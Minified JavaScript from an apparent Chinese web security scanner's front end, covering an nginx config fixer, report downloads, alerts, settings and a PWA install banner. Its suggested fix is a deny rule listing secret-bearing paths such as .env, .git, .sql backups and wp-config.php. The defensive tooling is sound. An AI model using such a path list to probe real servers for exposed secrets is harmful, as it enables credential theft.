t=/listen\s+443/i.test(e),s=/return\s+301\s+https/i.test(e)||/rewrite.*https/i.test(e);!t&&!s&&/listen\s+80/i.test(e)&&i.push({name:"HTTP 到 HTTPS 跳转未配置",severity:"high",reason:"仅监听 HTTP 80 端口且未配置 HTTPS 跳转，所有通信为明文传输。",fix:`server {
    listen 80;
    server_name _;
    return 301 https://$host$request_uri;
}`}),/\.env|deny\s+all|location.*\.(env|git|sql|zip|bak)/i.test(e)||i.push({name:"敏感文件拦截未配置",severity:"high",reason:"未配置敏感文件访问拦截规则，.env、.git、.sql 等文件可能被直接访问。",fix:`location ~ /(.env|.git|.gitignore|.*.sql|.*.zip|.*.tar.gz|.*.bak|.*.log|wp-config.php) {
    deny all;
    return 403;
}`});let r=e,o=[],a=[];if(i.forEach(function(c){c.name==="敏感文件拦截未配置"?a.push(c.fix):c.name!=="HTTP 到 HTTPS 跳转未配置"&&o.push(c.fix)}),o.length>0||a.length>0){let c=r.lastIndexOf("}");if(c>0){let p=r.substring(0,c),v=r.substring(c);o.length>0&&o.forEach(function(d){p+="    "+d+`
`}),a.length>0&&a.forEach(function(d){d.split(`
`).forEach(function(h){h.trim()&&(p+="    "+h.trim()+`
`)})}),r=p+v}}let n=ua(e,r);return{issues:i,fixed:r,diff:n}}function ua(e,i){let t=e.split(`
`),s=i.split(`
`),r=[],o=!1;for(let a=0;a<s.length;a++)a<t.length?t[a]!==s[a]?(o||(r.push({type:"context",text:"..."}),o=!0),r.push({type:"add",text:"+ "+s[a]})):(o&&a>0&&(r.push({type:"context",text:"..."}),o=!1),r.push({type:"context",text:"  "+s[a]})):r.push({type:"add",text:"+ "+s[a]});return r}function fa(e,i){try{e=e||{issues:[],fixed:"",diff:[]},e.issues=e.issues||[],e.diff=e.diff||[];let t="",s=0,r=0,o=0;e.issues.forEach(function(n){n.severity==="high"?s++:n.severity==="medium"?r++:o++}),t+='<div class="card fade-in-up">',t+='<div class="card-title">检测结果</div>',t+='<div class="risk-stats" style="margin-bottom:0">',t+='<div class="risk-stat high"><div class="num">'+s+'</div><div class="label">高严重</div></div>',t+='<div class="risk-stat medium"><div class="num">'+r+'</div><div class="label">中严重</div></div>',t+='<div class="risk-stat low"><div class="num">'+o+'</div><div class="label">低严重</div></div>',t+="</div></div>",t+='<div class="card fade-in-up" style="animation-delay:0.1s">',t+='<div class="card-title">修复点清单</div>',e.issues.forEach(function(n){t+='<div class="issue-item">',t+='<span class="issue-severity '+n.severity+'">'+(n.severity==="high"?"高":n.severity==="medium"?"中":"低")+"</span>",t+="<div>",t+="<strong>"+fe(n.name)+"</strong>",t+='<p class="issue-reason">'+fe(n.reason)+"</p>",t+="</div></div>"}),t+="</div>",t+='<div class="card fade-in-up" style="animation-delay:0.2s">',t+='<div class="card-title">修复前后对比</div>',t+='<div class="compare-grid">',t+='<div class="compare-col"><h4><span class="dot red"></span>修复前</h4>',t+='<textarea class="compare-textarea" readonly>'+fe(i)+"</textarea></div>",t+='<div class="compare-col"><h4><span class="dot green"></span>修复后 <button class="copy-btn-sm" onclick="copyFixedConfig(this)" data-state="idle" aria-label="复制修复后配置">复制</button></h4>',t+='<textarea class="compare-textarea fixed-textarea" readonly>'+fe(e.fixed)+"</textarea></div>",t+="</div></div>",t+='<div class="card fade-in-up" style="animation-delay:0.3s">',t+='<div class="card-title">Diff 展示</div>',t+='<div class="diff-container">',e.diff.forEach(function(n){t+='<div class="diff-line '+n.type+'">'+fe(n.text)+"</div>"}),t+="</div></div>",t+='<div class="card fade-in-up" style="animation-delay:0.4s">',t+='<div class="card-title">操作</div>',t+='<div class="fixer-btns">',t+='<button class="fixer-btn success" onclick="copyFixerResult()">复制修复后配置</button>',t+='<button class="fixer-btn primary" onclick="downloadNginxConf()">下载服务器配置文件</button>',t+='<button class="fixer-btn success" onclick="downloadRepairReport()">下载修复报告包</button>',t+="</div></div>";let a=document.getElementById("fixer-result");a&&(a.innerHTML=t)}catch(t){console.error("renderFixerResult error:",t);let s=document.getElementById("fixer-result");s&&(s.innerHTML='<div class="card"><p style="color:var(--danger)">渲染失败: '+fe(t.message||String(t))+"</p></div>")}}function ga(){let e=document.querySelector("#fixer-result .compare-col:last-child textarea");if(!e)return;let i=e.value,t=new Blob([i],{type:"text/plain;charset=utf-8"}),s=URL.createObjectURL(t),r=document.createElement("a");r.href=s,r.download="Nginx 配置文件",document.body.appendChild(r),r.click(),document.body.removeChild(r),URL.revokeObjectURL(s),ie("服务器配置文件已下载")}function ha(){if(!di){ie("请先分析配置");return}let e=di,i=`=== 漏洞哨兵修复报告 ===
`;i+="生成时间："+new Date().toLocaleString("zh-CN")+`

`,i+=`--- 原始风险 ---
`,e.issues.forEach(function(o,a){i+=a+1+". ["+o.severity.toUpperCase()+"] "+o.name+`
`,i+="   原因："+o.reason+`
`}),i+=`
--- 修复项 ---
`,e.issues.forEach(function(o,a){i+=a+1+". "+o.name+`：已修复
`}),i+=`
--- 修复后配置 ---
`,i+=e.fixed+`
`,i+=`
--- 复测建议 ---
`,i+=`1. 使用 curl -I 检查响应头是否包含安全头
`,i+=`2. 访问 /.env 等敏感路径应返回 403
`,i+=`3. 使用 SSL Labs 检测 HTTPS 配置
`,i+=`4. 检查 Content-Security-Policy 是否生效
`;let t=new Blob([i],{type:"text/plain;charset=utf-8"}),s=URL.createObjectURL(t),r=document.createElement("a");r.href=s,r.download="repair-report.txt",document.body.appendChild(r),r.click(),document.body.removeChild(r),URL.revokeObjectURL(s),ie("修复报告已下载")}function va(e,i){if(i)try{let t=decodeURIComponent(atob(i));ma(t),ie("已复制到剪贴板")}catch{ie("复制失败")}}function ma(e){if(navigator.clipboard&&navigator.clipboard.writeText)navigator.clipboard.writeText(e);else{let i=document.createElement("textarea");i.value=e,i.style.position="fixed",i.style.left="-9999px",document.body.appendChild(i),i.select(),document.execCommand("copy"),document.body.removeChild(i)}}function ya(e){document.querySelectorAll(".profile-tab").forEach(function(t){t.style.display="none"});let i=document.getElementById("profile-tab-"+e);i&&(i.style.display="block",i.scrollIntoView({behavior:"smooth",block:"start"})),e==="history"&&renderScanHistory(),e==="monitor"&&renderMonitorTargets(),e==="ai-config"&&Dn(),e==="alerts"&&Ei(),e==="notifications"&&Ea(),e==="credits"&&hi()}function ba(e,i){let t=document.getElementById("setting-"+i);if(!t)return;let s=t.dataset.enabled==="true";t.dataset.enabled=s?"false":"true",t.classList.toggle("on",!s);let r=!s;i==="darkMode"&&(r?(document.documentElement.setAttribute("data-theme","dark"),(function(){try{localStorage.setItem("vs_dark","1")}catch{}})()):(document.documentElement.removeAttribute("data-theme"),(function(){try{localStorage.removeItem("vs_dark")}catch{}})()),updateThemeIcon(r)),i==="auto保存"&&(function(){try{localStorage.setItem("vs_autosave",r?"1":"0")}catch{}})(),i==="notify"&&(function(){try{localStorage.setItem("vs_notify",r?"1":"0")}catch{}})(),ie("设置已更新")}function Nn(){try{let e=localStorage.getItem("vs_ai_config");if(e)return JSON.parse(e)}catch{}return{api_key:"",provider:"openai",model:"",use_llm:!0}}function xa(){let e=document.getElementById("ai-config-apikey").value.trim(),i=document.getElementById("ai-config-provider").value,t=document.getElementById("ai-config-model").value.trim(),s=document.getElementById("setting-useLLM").dataset.enabled==="true",r={api_key:e,provider:i,model:t,use_llm:s};try{localStorage.setItem("vs_ai_config",JSON.stringify(r)),ie("安全顾问配置已保存")}catch(o){ie("保存失败："+(o.message||"浏览器存储受限"),"error")}}function wa(){try{localStorage.removeItem("vs_ai_config"),document.getElementById("ai-config-apikey").value="",document.getElementById("ai-config-provider").value="openai",document.getElementById("ai-config-model").value="";let e=document.getElementById("setting-useLLM");e&&(e.dataset.enabled="true",e.textContent="已开启",e.style.color="var(--success)"),ie("安全顾问配置已清除")}catch{}}function ka(e){let i=document.getElementById("setting-"+(e==="useLLM"?"useLLM":e));if(!i)return;let t=i.dataset.enabled==="true";i.dataset.enabled=t?"false":"true",i.classList.toggle("on",!t)}function Ei(e){let i=document.getElementById("alerts-list");i&&(i.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取告警...</div>',fetch("/api/alerts?limit=20&unread_only=false",{headers:Ke()}).then(function(t){return t.json()}).then(function(t){let s=t.alerts||[];if(s.length===0){i.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">暂无告警记录</div>',document.getElementById("alerts-pagination").style.display="none";return}let r="";s.forEach(function(o){let a=!!o.is_read,n="";o.alert_type==="high_risk_found"||o.alert_type==="monitor_down"?n='<span style="background:var(--danger);color:#fff;font-size:11px;padding:2px 6px;border-radius:2px;margin-left:6px">高危</span>':o.alert_type==="score_drop"?n='<span style="background:var(--warning);color:#fff;font-size:11px;padding:2px 6px;border-radius:2px;margin-left:6px">评分下降</span>':o.alert_type==="scan_complete"&&(n='<span style="background:var(--success);color:#fff;font-size:11px;padding:2px 6px;border-radius:2px;margin-left:6px">完成</span>'),r+='<div class="menu-item" style="margin-bottom:8px;opacity:'+(a?"0.7":"1")+'">',r+='<div style="flex:1">',r+='<div style="font-weight:600;font-size:14px">'+fe(o.title||o.message||"告警")+n+"</div>",r+='<div style="font-size:12px;color:var(--text-secondary);margin-top:4px">'+fe(o.created_at||"")+"</div>",r+='<div style="font-size:13px;color:var(--text);margin-top:4px">'+fe(o.message||"")+"</div>",r+="</div>",a||(r+='<button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px;margin-left:8px;white-space:nowrap" onclick="markAlertRead('+o.id+', event)">标记已读</button>'),r+="</div>"}),i.innerHTML=r,document.getElementById("alerts-pagination").style.display="none",Ye()}).catch(function(t){i.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">读取失败</div>'}))}function _a(e,i){i&&i.stopPropagation(),fetch("/api/alerts/"+e+"/read",{method:"POST",headers:Ke()}).then(function(t){return t.json()}).then(function(t){t.success&&(Ei(),Ye())})}function Sa(){fetch("/api/alerts?limit=100",{headers:Ke()}).then(function(e){return e.json()}).then(function(e){let t=(e.alerts||[]).filter(function(r){return!r.is_read});if(t.length===0){ie("没有未读告警");return}let s=0;t.forEach(function(r){fetch("/api/alerts/"+r.id+"/read",{method:"POST",headers:Ke()}).then(function(){s++,s>=t.length&&(Ei(),Ye(),ie("已全部标记为已读"))})})})}function Ye(){if(!Le()){let e=document.getElementById("nav-alert-badge");e&&(e.style.display="none");return}fetch("/api/alerts/unread-count",{headers:Ke()}).then(function(e){return e.json()}).then(function(e){let i=document.getElementById("nav-alert-badge");if(!i)return;let t=e.unread_count||0;t>0?(i.textContent=t>99?"99+":t,i.style.display="inline-block"):i.style.display="none"})}function Ea(){fetch("/api/me/notifications",{headers:Ke()}).then(function(e){return e.json()}).then(function(e){if(e.success){let i=document.getElementById("notify-email-input"),t=document.getElementById("notify-webhook-input"),s=document.getElementById("notify-threshold-select");i&&(i.value=e.email||""),t&&(t.value=e.webhook||""),s&&(s.value=e.threshold||"high")}})}function za(){let e=document.getElementById("notify-email-input").value.trim(),i=document.getElementById("notify-webhook-input").value.trim(),t=document.getElementById("notify-threshold-select").value;fetch("/api/me/notifications",{method:"POST",headers:Object.assign({"Content-Type":"application/json"},Ke()),body:JSON.stringify({email:e,webhook:i,threshold:t})}).then(function(s){return s.json()}).then(function(s){s.success?ie("通知设置已保存","success"):ie(s.error||"保存失败","error")})}function Ia(){let e=document.getElementById("ai-config-apikey"),i=document.getElementById("ai-config-eye");!e||!i||(e.type==="password"?(e.type="text",i.textContent="隐藏"):(e.type="password",i.textContent="显示"))}function Dn(){let e=Nn(),i=document.getElementById("ai-config-apikey"),t=document.getElementById("ai-config-provider"),s=document.getElementById("ai-config-model"),r=document.getElementById("setting-useLLM");if(i&&(i.value=e.api_key||""),t&&(t.value=e.provider||"openai"),s&&(s.value=e.model||""),r){let o=e.use_llm!==!1;r.dataset.enabled=o?"true":"false",r.classList.toggle("on",o)}}let Ge=null;function Un(){try{if(window.__TAURI__||window.__TAURI_INTERNALS__)return}catch{}if(window.matchMedia&&window.matchMedia("(display-mode: standalone)").matches||document.getElementById("pwa-install-banner"))return;let e=document.createElement("div");e.id="pwa-install-banner",e.style.cssText="position:fixed;left:16px;right:16px;bottom:16px;z-index:9998;background:#1e293b;color:#fff;border:1px solid rgba(115,201,144,0.35);border-radius:12px;padding:12px 14px;box-shadow:0 14px 32px rgba(0,0,0,0.28);display:flex;gap:12px;align-items:center;justify-content:space-between;flex-wrap:wrap",e.innerHTML='<div style="min-width:220px;flex:1"><div style="font-size:13px;font-weight:700;margin-bottom:2px">安装为桌面应用</div><div style="font-size:12px;color:#cbd5e1;line-height:1.5">把漏洞哨兵加入桌面或开始菜单，像 App 一样直接打开。</div></div><div style="display:flex;gap:8px;flex-wrap:wrap"><button id="pwa-install-btn" style="background:#73c990;color:#0f172a;border:none;padding:8px 14px;border-radius:8px;font-weight:700;cursor:pointer">立即安装</button><button id="pwa-install-close" style="background:transparent;color:#cbd5e1;border:1px solid rgba(203,213,225,0.28);padding:8px 14px;border-radius:8px;cursor:pointer">稍后</button></div>',document.body.appendChild(e);var i=document.getElementById("pwa-install-close"),t=document.getElementById("pwa-install-btn");i&&i.addEventListener("click",function(){e.remove();try{localStorage.setItem("vs_pwa_banner_hidden","true")}catch{}}),t&&t.addEventListener("click",async function(){Ge?(Ge.prompt(),await Ge.userChoice,Ge=null):ie("当前不支持浏览器安装提示。","info"),e.remove();try{localStorage.setItem("vs_pwa_banner_hidden","true")}catch{}})}window.addEventListener("beforeinstallprompt",function(e){e.preventDefault(),Ge=e;try{if(localStorage.getItem("vs_pwa_banner_hidden")==="true")return}catch{}Un()});window.addEventListener("appinstalled",function(){Ge=null;const e=document.getElementById("pwa-install-banner");e&&e.remove()});document.addEventListener("DOMContentLoaded",function(){let e=ke("app");e&&Ci&&(e.innerHTML=Ci);try{jo()}catch(d){console.warn("initAuthCheckboxBinding error:",d)}try{Ge&&localStorage.getItem("vs_pwa_banner_hidden")!=="true"&&Un()}catch{}tr().then(function(d){let f=d&&d.data||d||{};f.stripe_publishable_key&&(window.__STRIPE_PUBLISHABLE_KEY__=f.stripe_publishable_key),f.public_base_url&&(window.__PUBLIC_BASE_URL__=f.public_base_url)}).catch(function(){});let i=ke("skeleton-screen");i&&i.classList.add("hidden"),setTimeout(function(){i&&(i.style.display="none")},350);let t={quick:"约 1-2 秒 · 仅响应头",standard:"约 3-5 秒 · 推荐",deep:"约 10+ 秒 · 含攻击测试"};document.querySelectorAll(".scan-depth-opt").forEach(function(d){d.addEventListener("click",function(f){f.preventDefault();let h=this.getAttribute("data-value"),m=this.querySelector('input[type="radio"]');m&&(m.checked=!0,m.dispatchEvent(new Event("change",{bubbles:!0}))),document.querySelectorAll(".scan-depth-opt").forEach(function(y){y.classList.remove("active"),y.style.background="var(--bg)",y.style.color="var(--text)"}),this.classList.add("active"),this.style.background="var(--primary)",this.style.color="#fff";let g=document.getElementById("depth-hint");g&&(g.textContent=t[h]||"约 3-5 秒 · 推荐")})});try{updateProfileStats()}catch(d){console.warn("updateProfileStats error:",d)}try{dt()}catch(d){console.warn("updateAuthUI error:",d)}try{Dn()}catch(d){console.warn("renderAIConfig error:",d)}try{let d=document.getElementById("setting-notify");if(d){let f=localStorage.getItem("vs_notify")!=="0";d.dataset.enabled=f?"true":"false",d.classList.toggle("on",f)}}catch{}Le()&&typeof window.loadTrendChart=="function"&&window.loadTrendChart(30),Le()&&Ee("/api/history?limit=1").then(function(d){d.status===401&&typeof ie=="function"&&ie("登录已过期，请重新登录")}).catch(function(){});try{if(localStorage.getItem("vs_dark")==="1"){document.documentElement.setAttribute("data-theme","dark");let d=ke("setting-darkMode");d&&(d.dataset.enabled="true",d.textContent="已开启",d.style.color="var(--success)"),r(!0)}}catch{}function s(){let d=document.documentElement.getAttribute("data-theme")==="dark";if(d){document.documentElement.removeAttribute("data-theme");try{localStorage.removeItem("vs_dark")}catch{}let f=ke("setting-darkMode");f&&(f.dataset.enabled="false",f.textContent="未开启",f.style.color="var(--text-lighter)"),ie("已切换至亮色模式")}else{document.documentElement.setAttribute("data-theme","dark");try{localStorage.setItem("vs_dark","1")}catch{}let f=ke("setting-darkMode");f&&(f.dataset.enabled="true",f.textContent="已开启",f.style.color="var(--success)"),ie("已切换至暗色模式")}r(!d)}window.toggleThemeQuick=s;function r(d){let f=ke("theme-icon");f&&(d?f.innerHTML='<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>':f.innerHTML='<circle cx="12" cy="12" r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/>')}window.updateThemeIcon=r;let o=ke("login-password");o&&o.addEventListener("keydown",function(d){d.key==="Enter"&&Di()});let a=ke("reg-email"),n=ke("reg-password"),c=ke("reg-password2");a&&a.addEventListener("keydown",function(d){d.key==="Enter"&&At()}),n&&n.addEventListener("keydown",function(d){d.key==="Enter"&&At()}),c&&c.addEventListener("keydown",function(d){d.key==="Enter"&&At()});let p=ke("scan-url");p&&p.addEventListener("keydown",function(d){if(d.key!=="Enter")return;let f=document.getElementById("auth-check-step1");f&&f.checked&&Le()?typeof window.startScanDirect=="function"&&window.startScanDirect():typeof window.goVerifyStep2=="function"&&window.goVerifyStep2()}),document.addEventListener("keydown",function(d){if(d.key==="Escape"){let f=document.getElementById("ai-chat");if(f&&f.classList.contains("show")){f.classList.remove("show"),f.style.display="";return}document.querySelectorAll('.modal.show, [id$="-modal"][style*="display: block"]').forEach(function(m){m.style.display="none",m.classList.remove("show")})}if((d.ctrlKey||d.metaKey)&&d.key==="k"){d.preventDefault();let f=document.getElementById("scanUrl")||document.getElementById("scan-url");f&&(f.focus(),f.select())}if((d.ctrlKey||d.metaKey)&&d.key==="/"){d.preventDefault();let f=document.querySelector('[onclick*="aiChat" i], [onclick*="openAiAdvisor" i], [onclick*="showAiChat" i], #ai-advisor-btn, .ai-advisor-fab');f||(f=document.querySelector('button[aria-label*="安全顾问" i], button[aria-label*="AI" i]')),f?f.click():typeof toggleAiChat=="function"?toggleAiChat():typeof openAiAdvisor=="function"&&openAiAdvisor()}});function v(){document.querySelectorAll(".counter[data-count]").forEach(function(f){let h=parseInt(f.getAttribute("data-count"),10),m=f.getAttribute("data-suffix")||"",g=1200,y=0,b=null;function k(x){b||(b=x);let I=Math.min((x-b)/g,1),z=1-Math.pow(1-I,3),R=Math.floor(y+(h-y)*z);f.textContent=R+m,I<1&&requestAnimationFrame(k)}requestAnimationFrame(k)})}document.querySelector(".counter[data-count]")&&setTimeout(v,300),window.navigateTo=_t,window.toggleAIChat=ia,window.sendAIMessage=jn,window.askAIQuick=aa,window.analyzeFixer=ca,window.loadSampleConfig=la,window.clearFixer=da,window.doLogin=Di,window.doRegister=At,window.doLogout=Mn,window.refreshAuthChallenge=Uo,window.copyApiToken=qo,window.doResetPassword=$o,window.toggleAuthForm=On,window.showProfileTab=ya,window.markAllAlertsRead=Sa,window.toggleSetting=ba,window.saveNotificationSettings=za,window.toggleApiKeyVisibility=Ia,window.saveAIConfig=xa,window.clearAIConfig=wa,window.loadCreditsUsage=hi,window.updateUserCredits=Re,window.scanAsset=ta,window.extractError=it,window.friendlyError=Hn,window.showToast=ie,window.isLoggedIn=Le,window.toggleAISetting=ka,window.editAsset=Qo,window.deleteAsset=ea,window.createMonitor=Go,window.aiSend=Fn,window.aiAsk=Rn,window.createTeam=Yo,window.markAlertRead=_a,window.loadEvolution=Jt;try{Po()}catch(d){console.warn("initBillingPage error:",d)}document.body.addEventListener("click",function(d){d.target.closest('[data-action="add-asset"]')&&(d.preventDefault(),wo())})});typeof window<"u"&&(window.downloadNginxConf=ga,window.downloadRepairReport=ha);typeof window<"u"&&(window.copyText=va,window.submitFindingFeedback=Xo);
